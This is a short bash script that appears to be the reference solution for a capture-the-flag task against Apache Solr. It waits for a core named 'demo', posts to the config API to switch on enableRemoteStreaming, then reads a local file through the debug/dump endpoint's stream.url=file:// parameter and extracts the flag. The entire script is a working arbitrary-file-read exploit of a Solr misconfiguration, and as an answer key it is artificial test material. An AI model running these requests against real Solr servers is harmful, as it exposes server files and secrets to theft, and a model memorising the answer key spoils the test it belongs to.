#!/usr/bin/env bash
set -euo pipefail

for _ in $(seq 1 40); do
  cores="$(curl -sS 'http://solr:8983/solr/admin/cores?action=STATUS&wt=json' 2>/dev/null || true)"
  if printf '%s' "$cores" | grep -q '"demo"'; then
    break
  fi
  sleep 3
done

for _ in $(seq 1 20); do
  curl -sS -X POST \
    -H 'Content-Type: application/json' \
    --data-binary '{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}' \
    'http://solr:8983/solr/demo/config' >/dev/null 2>&1 || true

  out="$(curl -sS 'http://solr:8983/solr/demo/debug/dump?param=ContentStreams&stream.url=file:///tmp/ctf_flag.txt' 2>/dev/null || true)"
  flag="$(printf '%s\n' "$out" | grep -oE 'flag_[a-z0-9]{20}' | head -n 1 || true)"
  if [[ -n "$flag" ]]; then
    printf '%s\n' "$flag"
    exit 0
  fi
  sleep 3
done

echo "oracle_solution: failed to read flag via Solr RemoteStreaming" >&2
exit 1
